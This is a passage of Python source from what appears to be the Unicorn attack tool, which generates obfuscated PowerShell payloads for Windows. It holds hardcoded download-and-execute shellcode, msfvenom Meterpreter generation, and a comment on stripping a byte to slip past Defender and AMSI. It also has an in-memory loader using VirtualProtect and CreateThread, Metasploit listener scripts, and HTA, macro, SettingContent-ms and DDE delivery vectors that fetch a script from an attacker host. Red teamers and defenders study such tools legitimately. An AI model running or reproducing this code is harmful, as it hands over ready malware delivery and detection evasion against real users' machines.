        shellcode = ("\\x33\\xC9\\x64\\x8B\\x41\\x30\\x8B\\x40\\x0C\\x8B"
                     "\\x70\\x14\\xAD\\x96\\xAD\\x8B\\x58\\x10\\x8B\\x53"
                     "\\x3C\\x03\\xD3\\x8B\\x52\\x78\\x03\\xD3\\x8B\\x72"
                     "\\x20\\x03\\xF3\\x33\\xC9\\x41\\xAD\\x03\\xC3\\x81"
                     "\\x38\\x47\\x65\\x74\\x50\\x75\\xF4\\x81\\x78\\x04"
                     "\\x72\\x6F\\x63\\x41\\x75\\xEB\\x81\\x78\\x08\\x64"
                     "\\x64\\x72\\x65\\x75\\xE2\\x8B\\x72\\x24\\x03\\xF3"
                     "\\x66\\x8B\\x0C\\x4E\\x49\\x8B\\x72\\x1C\\x03\\xF3"
                     "\\x8B\\x14\\x8E\\x03\\xD3\\x33\\xC9\\x51\\x68\\x2E"
                     "\\x65\\x78\\x65\\x68\\x64\\x65\\x61\\x64\\x53\\x52"
                     "\\x51\\x68\\x61\\x72\\x79\\x41\\x68\\x4C\\x69\\x62"
                     "\\x72\\x68\\x4C\\x6F\\x61\\x64\\x54\\x53\\xFF\\xD2"
                     "\\x83\\xC4\\x0C\\x59\\x50\\x51\\x66\\xB9\\x6C\\x6C"
                     "\\x51\\x68\\x6F\\x6E\\x2E\\x64\\x68\\x75\\x72\\x6C"
                     "\\x6D\\x54\\xFF\\xD0\\x83\\xC4\\x10\\x8B\\x54\\x24"
                     "\\x04\\x33\\xC9\\x51\\x66\\xB9\\x65\\x41\\x51\\x33"
                     "\\xC9\\x68\\x6F\\x46\\x69\\x6C\\x68\\x6F\\x61\\x64"
                     "\\x54\\x68\\x6F\\x77\\x6E\\x6C\\x68\\x55\\x52\\x4C"
                     "\\x44\\x54\\x50\\xFF\\xD2\\x33\\xC9\\x8D\\x54\\x24"
                     "\\x24\\x51\\x51\\x52\\xEB\\x47\\x51\\xFF\\xD0\\x83"
                     "\\xC4\\x1C\\x33\\xC9\\x5A\\x5B\\x53\\x52\\x51\\x68"
                     "\\x78\\x65\\x63\\x61\\x88\\x4C\\x24\\x03\\x68\\x57"
                     "\\x69\\x6E\\x45\\x54\\x53\\xFF\\xD2\\x6A\\x05\\x8D"
                     "\\x4C\\x24\\x18\\x51\\xFF\\xD0\\x83\\xC4\\x0C\\x5A"
                     "\\x5B\\x68\\x65\\x73\\x73\\x61\\x83\\x6C\\x24\\x03"
                     "\\x61\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\\x78\\x69"
                     "\\x74\\x54\\x53\\xFF\\xD2\\xFF\\xD0\\xE8\\xB4\\xFF"
                     "\\xFF\\xFF\\xURLHERE\\x00")

        url = ipaddr.replace("LHOST=", "").replace("url=", "")
        url_patched = url_hexified(str.encode(url))
        data = shellcode.replace("\\xURLHERE", url_patched)

    else:

        # gen random number for length
        #uri_length=generate_random_number(5,7)
        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --platform windows -f c".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false --smallest
        data, stderr_data = proc.communicate()
        if proc.returncode != 0:
            print("[!] msfvenom failed to generate shellcode (exit code {0}). Ensure Metasploit is installed, in your PATH, and your payload options are correct.".format(proc.returncode))
            if stderr_data:
                print(stderr_data.decode("utf-8", "replace").strip())
            sys.exit(1)
        # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
        data = data.decode("ascii").replace('"\\xfc', '"', 1)
        # bug output for metasploit, going to check here - if present then throw error message to end user
        if "no longer be in use" in data or "long,erbe,inus,e,so,tryd,elet,ingt" in data:
            print("[!] There was a problem generating the shellcode due to a Metasploit error. Please update Metasploit and re-run this.")
            sys.exit(1)

    # return the metasploit data
    return format_metasploit(data)

# generate the in-process shellcode loader. `format_payload` handles the final
# encoded command and the architecture-specific PowerShell child process.
def gen_shellcode_attack(payload, ipaddr, port, copy_mode=None):
    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS, LAST_OBFUSCATION_TRANSFORMS

    if ipaddr != "cobaltstrike":
        shellcode_text = generate_shellcode(payload, ipaddr, port).rstrip()
        shellcode = parse_shellcode_bytes(shellcode_text)
        if not "url=" in ipaddr:
            write_file(
                "unicorn.rc",
                "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(payload, ipaddr, port),
            )
    else:
        shellcode = parse_shellcode_bytes(payload)

    if not shellcode:
        print("[!] Critical: no shellcode bytes were found. Use 0xNN, 0xNN or Metasploit \\xNN format.")
        sys.exit(1)

    LAST_SHELLCODE_BYTES = shellcode
    LAST_SHELLCODE_SHA256 = sha256_bytes(shellcode)

    variables = unique_variable_names(9)
    source, encoded, type_name, allocation, old_protect, index, thread_id, length, temporary = variables
    plain_names = unique_plain_names(2, 4, 8)
    class_name = "U" + plain_names[0]
    namespace = "U" + plain_names[1]

    marker = random.choice([
        "!", "@", "#", "%", "^", "&", "*", "(", ")", "-", "+", "=", "{", "}",
        "|", ".", ":", ";", "<", ">", "?", "/",
    ])
    shellcode_string = shellcode_literal(shellcode, marker)
    allocation_size = max(len(shellcode), 0x1000)

    msv = mangle_word("msvcrt.dll")
    kernel = mangle_word("kernel32.dll")

    if copy_mode is None:
        copy_mode = random.choice(["memset", "marshal"])
    if copy_mode == "memset":
        memset_import = '[DllImport("%MSV%")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'
        copy_code = 'for(%INDEX%=0;%INDEX% -lt %SHELLCODE%.Length;%INDEX%++){%TYPE%::memset([IntPtr](%ALLOCATION%.ToInt32()+%INDEX%), %SHELLCODE%[%INDEX%], 1)}'
        LAST_LOADER_APIS = ["calloc", "memset", "VirtualProtect", "CreateThread"]
    else:
        memset_import = ""
        copy_code = '[System.Runtime.InteropServices.Marshal]::Copy(%SHELLCODE%, 0, %ALLOCATION%, %SHELLCODE%.Length)'
        LAST_LOADER_APIS = ["calloc", "Marshal.Copy", "VirtualProtect", "CreateThread"]

    import_blocks = [
        '[DllImport(("%MSV%"))]public static extern IntPtr calloc(uint dwSize, uint amount);',
        '[DllImport("%KERNEL%")]public static extern bool VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %OLD%);',
    ]
    if copy_mode == "memset":
        import_blocks.append(memset_import)
    import_blocks.append(
        '[DllImport("%KERNEL%")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr %THREAD_PARAM%);'
    )
    csharp_source = "".join(shuffled_imports(import_blocks, OBFUSCATION_LEVEL))

    allocation_literal = format_obfuscated_number(allocation_size, OBFUSCATION_LEVEL)
    protect_literal = format_obfuscated_number(0x40, OBFUSCATION_LEVEL)

    loader = r'''%SOURCE%='%CSHARP_SOURCE%';%SHELLCODE%="%SHELLCODE_BYTES%";%TYPE%=Add-Type -pass -m %SOURCE% -Name "%CLASS_NAME%" -names "%NAMESPACE%";[byte[]]%SHELLCODE% = %SHELLCODE%.replace("%MARKER%", "0x").Split(",");%LENGTH%=%ALLOC_SIZE%;%ALLOCATION%=%TYPE%::calloc(%LENGTH%, 1);[UInt64]%TEMP% = 0;%COPY_CODE%;%TYPE%::VirtualProtect(%ALLOCATION%, %LENGTH%, %PROTECT%, [Ref]%TEMP%);%THREAD_VAR%=[IntPtr]::Zero;%TYPE%::CreateThread([IntPtr]::Zero, 0, %ALLOCATION%, [IntPtr]::Zero, 0, [Ref]%THREAD_VAR%);'''

    replacements = {
        "%SOURCE%": source,
        "%CSHARP_SOURCE%": csharp_source,
        "%MSV%": msv,
        "%KERNEL%": kernel,
        "%OLD%": old_protect[1:],
        "%THREAD_PARAM%": thread_id[1:],
        "%THREAD_VAR%": thread_id,
        "%COPY_CODE%": copy_code,
        "%SHELLCODE%": encoded,
        "%SHELLCODE_BYTES%": shellcode_string,
        "%TYPE%": type_name,
        "%CLASS_NAME%": class_name,
        "%NAMESPACE%": namespace,
        "%MARKER%": marker,
        "%LENGTH%": length,
        "%ALLOC_SIZE%": allocation_literal,
        "%PROTECT%": protect_literal,
        "%ALLOCATION%": allocation,
        "%TEMP%": temporary,
        "%INDEX%": index,
    }
    for token, value in replacements.items():
        loader = loader.replace(token, value)

    loader = obfuscation_whitespace(loader, OBFUSCATION_LEVEL)
    LAST_OBFUSCATION_TRANSFORMS = obfuscation_transformations(OBFUSCATION_LEVEL)

    if PRINT_DECODED.lower() == "on":
        if AMSI_MODE != "off":
            print("# AMSI bypass and shellcode loader run in the same child process")
            print(build_amsi_bypass())
            print()
        print(loader)
        print("\n[*] PRINT_DECODED is ON. Turn it off for normal output.")
        sys.exit(0)

    return loader

def gen_ps1_attack(ps1path):
    if os.path.isfile(ps1path):
        with open(ps1path, 'r') as scriptfile:
            data = scriptfile.read()
            return data
    else:
        print("[!] {0} does not exist. Please check your path".format(ps1path))
        sys.exit(1)


def format_payload(powershell_code, attack_type, attack_modifier, option):
    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS, LAST_OBFUSCATION_TRANSFORMS

    gen_unicorn()
    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
    print("Twitter: @TrustedSec, @HackingDave")
    print("\nHappy Magic Unicorns.")

    if attack_type == "custom_ps1":
        LAST_SHELLCODE_BYTES = None
        LAST_SHELLCODE_SHA256 = None
        LAST_LOADER_APIS = []
        LAST_OBFUSCATION_TRANSFORMS = []

    if OUTPUT_PROFILE == "cmd":
        command_limit = CMD_LENGTH_LIMIT
    elif OUTPUT_PROFILE == "powershell":
        command_limit = POWERSHELL_LENGTH_LIMIT
    elif attack_modifier in ("hta", "ms", "macro"):
        command_limit = POWERSHELL_LENGTH_LIMIT
    else:
        command_limit = CMD_LENGTH_LIMIT

    if AMSI_MODE == "inline":
        child_script = build_amsi_bypass() + "\n" + powershell_code
    else:
        child_script = powershell_code

    encoded = base64.b64encode(child_script.encode("utf_16_le")).decode("ascii")
    if TARGET_ARCH == "x86":
        child_path = r"C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
    else:
        child_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    full_attack = 'powershell /w 1 /C "& \'{0}\' -w 1 -noexit -e {1}"'.format(child_path, encoded)

    if len(full_attack) > command_limit:
        print("[!] Generated command is {0} characters, above the {1} character limit.".format(len(full_attack), command_limit))
        print("[!] Use --profile powershell for a larger delivery context, use --amsi off, or use hta/macro/staged delivery.")
        sys.exit(1)

    manifest_command = full_attack

    # Cobalt Strike.
    if attack_type == "cs":
        if attack_modifier == "hta":
            gen_hta_attack(full_attack)
            cobalt_strike()
            hta_help()
            print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")
        elif attack_modifier == "ms":
            ms_voodoo_stuff()
            gen_hta_attack(full_attack)
            cobalt_strike()
            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
            settings_ms()
            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
        elif attack_modifier == "macro":
            macro_attack = generate_macro(full_attack)
            write_file("powershell_attack.txt", macro_attack)
            cobalt_strike()
            macro_help()
            print("[*] Exported the Cobalt Strike Unicorn Attack for Macros out to powershell_attack.txt. Enjoy!\n")
        else:
            write_file("powershell_attack.txt", full_attack)
            cobalt_strike()
            print("[*] Exported the Cobalt Strike Unicorn Attack codebase out to powershell_attack.txt. Enjoy!\n")

    # Custom shellcode.
    if attack_type == "shellcode":
        if attack_modifier == "hta":
            gen_hta_attack(full_attack)
            custom_shellcode()
            hta_help()
            print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")
        elif attack_modifier == "ms":
            ms_voodoo_stuff()
            gen_hta_attack(full_attack)
            custom_shellcode()
            shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
            settings_ms()
            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
        elif attack_modifier == "macro":
            macro_attack = generate_macro(full_attack)
            write_file("powershell_attack.txt", macro_attack)
            custom_shellcode()
            macro_help()
        else:
            write_file("powershell_attack.txt", full_attack)
            custom_shellcode()
            print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")

    # Metasploit and download/exec.
    if attack_type == "msf" or attack_type == "download/exec":
        if attack_modifier == "macro":
            macro_attack = generate_macro(full_attack)
            write_file("powershell_attack.txt", macro_attack)
            macro_help()
        elif attack_modifier == "hta":
            gen_hta_attack(full_attack)
            if os.path.isfile("unicorn.rc"):
                shutil.move("unicorn.rc", "hta_attack/")
            hta_help()
        elif attack_modifier == "ms":
            ms_voodoo_stuff()
            gen_hta_attack(full_attack)
            custom_shellcode()
            if os.path.isfile("Standalone_NoASR.SettingContent-ms"):
                shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
            if os.path.isfile("unicorn.rc"):
                shutil.move("unicorn.rc", "hta_attack/")
            settings_ms()
            print("[*] Exported SettingContent-ms and all HTA attack stuff to hta_attack as Standalone_NoASR.SettingContent-ms, Launcher.hta, and index.html.")
            print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
            print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
        else:
            if attack_modifier == "dde":
                full_attack_download = full_attack
                manifest_command = full_attack_download
                full_attack = '''DDE "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://%s/download.ps1'); # " "Microsoft Document Security Add-On"''' % (ipaddr)
                with open("download.ps1", "w") as fh:
                    fh.write(full_attack_download)
            write_file("powershell_attack.txt", full_attack)
            if attack_modifier != "dde":
                if AMSI_MODE != "off":
                    amsi_help()
                ps_help()
            if attack_modifier == "dde":
                dde_help()

    elif attack_type == "custom_ps1":
        if attack_modifier == "macro":
            macro_attack = generate_macro(full_attack, option)
            write_file("powershell_attack.txt", macro_attack)
        else:
            write_file("powershell_attack.txt", full_attack)
        custom_ps1_help()

    manifest = {
        "variant": {
            "seed": RANDOM_SEED,
            "architecture": TARGET_ARCH,
            "amsi_mode": AMSI_MODE,
            "profile": OUTPUT_PROFILE,
        },
        "delivery": {
            "attack_type": attack_type,
            "attack_modifier": attack_modifier,
            "command_length": len(full_attack),
            "command_limit": command_limit,
            "within_limit": len(full_attack) <= command_limit,
        },
        "shellcode": {
            "bytes": len(LAST_SHELLCODE_BYTES) if LAST_SHELLCODE_BYTES is not None else None,
            "sha256": LAST_SHELLCODE_SHA256,
        },
        "command": {
            "powershell_path": child_path,
            "encoded_child_sha256": hashlib.sha256(manifest_command.encode("utf-8")).hexdigest(),
            "raw_child_sha256": hashlib.sha256(child_script.encode("utf-8")).hexdigest(),
        },
        "obfuscation": {
            "level": OBFUSCATION_LEVEL,
            "transformations": LAST_OBFUSCATION_TRANSFORMS or [],
        },
        "apis": LAST_LOADER_APIS or [],
    }
    write_file("unicorn_manifest.json", json.dumps(manifest, indent=2))

    if attack_type == "msf" and attack_modifier == "hta":
        print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
        print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
    elif attack_type == "msf" or attack_type == "download/exec":
        print("[*] Exported powershell output code to powershell_attack.txt.")
        if attack_type != "download/exec":
            print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.")
        if attack_type == "download/exec":
            print("[*] This attack does not rely on Metasploit, its custom shellcode. Whatever you execute, if its a payload that is a reverse connection, make sure you have a listener setup.")
        if attack_modifier == "dde":
            print("[*] Exported download.ps1 which is what you use for code execution. (READ INSTRUCTIONS)")
        print("\n")
    elif attack_type == "custom_ps1":
        print("[*] Exported powershell output code to powershell_attack.txt")
    print("[*] Exported unicorn_manifest.json for reproducible detection testing.")

def ms_voodoo_stuff():
    # read file content in
    ms_input = open("templates/Standalone_NoASR.SettingContent-ms", "r").read()
    # write the content out
    write_file("Standalone_NoASR.SettingContent-ms", ms_input)
    settings_ms()

# pull the variables needed for usage
try:
    attack_type = ""
    attack_modifier = ""
    payload = ""
    ps1path = ""

    if len(sys.argv) > 1:
        os.system("clear")
        gen_unicorn()
        payload_options = ["powershell","macro","hta","cert","custom","dde","cobalt","general"]
        help_options = ["-h","--help"]

        if len(sys.argv) > 2:
            if sys.argv[2] in payload_options and sys.argv[1] in help_options:
                # Show help for specific payload options
                if sys.argv[2] == "powershell":
                    ps_help()
                    gen_usage()
                    sys.exit()
                elif sys.argv[2] == "macro" and re.search(r'\.ps1$', sys.argv[1]) is None: # "unicorn.py PATH.ps1 macro" not working, there's a fix
                    macro_help()
                    gen_usage()
                    sys.exit()
                elif sys.argv[2] == "hta":
                    hta_help()
                    gen_usage()
                    sys.exit()
                elif sys.argv[2] == "cert":
                    cert_help()
                    gen_usage()
                    sys.exit()
                elif sys.argv[2] == "custom":
                    custom_ps1_help()
                    custom_shellcode()
                    gen_usage()
                    sys.exit()
                elif sys.argv[2] == "dde":
                    dde_help()
                    gen_usage()
                    sys.exit()
                elif sys.argv[2] == "cobalt":
                    cobalt_strike()
                    gen_usage()
                    sys.exit()
                elif sys.argv[2] == "general":
                    gen_usage()
                    sys.exit()
        elif len(sys.argv) <= 2 and sys.argv[1] in help_options:
            # Show all help menus if none specified
            ps_help()
            macro_help()
            hta_help()
            cert_help()
            custom_ps1_help()
            dde_help()
            cobalt_strike()
            gen_usage()
            sys.exit()

        # Keep the x86 downgrade for the default profile. Preserve x64
        # meterpreter when the user explicitly selects --arch x64.
        if ("windows/x64/meterpreter") in sys.argv[1] and TARGET_ARCH == "x86":
            print("[!] WARNING: x64 meterpreter payload selected with the default x86 profile. Unicorn is downgrading the payload to x86. Use --arch x64 to keep x64 shellcode.")
            sys.argv[1] = sys.argv[1].replace("windows/x64/", "windows/")

        # settings option for SettingContent-ms filetype attack vector
        if sys.argv[1] == "ms":
            attack_type = ("ms")

        else:
            if len(sys.argv) > 2 and sys.argv[2] == "crt":
                attack_type = "crt"
                payload = sys.argv[1]
            elif re.search(r'\.ps1$', sys.argv[1]) is not None:
                attack_type = "custom_ps1"
                ps1path = sys.argv[1]

            elif sys.argv[1] =="windows/download_exec":
                attack_type = "download/exec"
                port = "none"
                if "macro" in sys.argv: attack_modifier = "macro"

            elif sys.argv[2] == "cs":
                attack_type = "cs"

                # using hta attack within custom shellcode or cobalt strike
                if "hta" in sys.argv: 
                    attack_modifier = "hta"

                if "ms" in sys.argv:
                    attack_modifier = "ms"

                # using macro attack within custom shellcode or co balt strike
                if "macro" in sys.argv:
                    attack_modifier = "macro"

            elif sys.argv[2] == "shellcode":
                attack_type = "shellcode"
                if "hta" in sys.argv:
                    attack_modifier = "hta"
                if "ms" in sys.argv:
                    attack_modifier = "ms"
                if "macro" in sys.argv:
                    attack_modifier = "macro"

            else:
                attack_type = "msf"
                payload = sys.argv[1]

    # if we are using macros
    if len(sys.argv) == 5:
        if attack_type == "msf":  # msf macro attack
            ipaddr = sys.argv[2]
            port = sys.argv[3]
            attack_modifier = sys.argv[4]
            ps = gen_shellcode_attack(payload, ipaddr, port)

        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit(1)

        format_payload(ps, attack_type, attack_modifier, None)

    # this is our cobalt strike and custom shellcode menu
    elif attack_type == "cs" or attack_type == "shellcode": 
        if not os.path.isfile(sys.argv[1]): 
            print("[!] File not found. Check the path and try again.")
            sys.exit(1)
        payload = open(sys.argv[1], "r").read()

        if not "," in payload:

            # attempt to see if its metasploit
            payload = format_metasploit(payload)

        if attack_type == "cs":
            #if not "char buf[] =" in payload:
            if not "byte[] buf = new byte" in payload:
                if not " byte buf[]" in payload:
                    print("[!] Cobalt Strike file either not formatted properly or not the C#/CS format.")
                    sys.exit(1)

            payload = payload.split("{")[1].replace(" };", "").replace(" ", "") # stripping out so we have 0x00 format

        ipaddr = "cobaltstrike"
        port = "cobaltstrike"
        ps = gen_shellcode_attack(payload, ipaddr, port)
        if attack_type == "cs" and attack_modifier not in ("hta", "macro", "ms"):
            attack_modifier = ("cs")

        format_payload(ps, attack_type, attack_modifier, None)

    # default unicorn & custom ps1 macro attacks
    elif len(sys.argv) == 4 or attack_type == "download/exec":
        if attack_type == "custom_ps1":  # custom ps1 macro attack
            attack_modifier = sys.argv[2]
            option = sys.argv[3]
            ps = gen_ps1_attack(ps1path)
        elif attack_type == "msf" or attack_type == "download/exec":
            payload = sys.argv[1]
            if attack_type != "download/exec":
                port = sys.argv[3]
            ipaddr = sys.argv[2]
            if attack_modifier != "macro":
                attack_modifier = ""
            option = None
            ps = gen_shellcode_attack(payload, ipaddr, port)

        # It should not be possible to get here, but just in case it does for some reason in the future, it will
        # prevent usage of 'ps' and 'option', causing the app to crash
        else:
            print("[!] Something went way wrong while generating payload.")
            sys.exit(1)

        format_payload(ps, attack_type, attack_modifier, option)

    elif len(sys.argv) == 3:
        # Matthews base64 cert attack or cs
        if attack_type == "crt":
            cert_help()
            # generate the attack vector
            gen_cert_attack(payload)
        elif attack_type == "custom_ps1":
            attack_modifier = sys.argv[2]
            ps = gen_ps1_attack(ps1path)
            format_payload(ps, attack_type, attack_modifier, None)

        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit(1)

    elif len(sys.argv) == 2:
        if attack_type == "custom_ps1":
            ps = gen_ps1_attack(ps1path)
            format_payload(ps, attack_type, None, None)

        # here we start the magic voodoo stuff for SettingContent-ms
        elif attack_type == "ms":
            ms_voodoo_stuff()

        else:
            print("[!] Options not understood or missing. Use --help switch for assistance.")
            sys.exit(1)

    # if we did supply parameters
    elif len(sys.argv) < 2:
        gen_unicorn()
        gen_usage()

except KeyboardInterrupt:
    print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
    sys.exit()

except Exception as e:
    if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python3 unicorn.py for all usage.")
    else: print("[!] Something went wrong, printing the error: " + str(e))
    sys.exit(1)
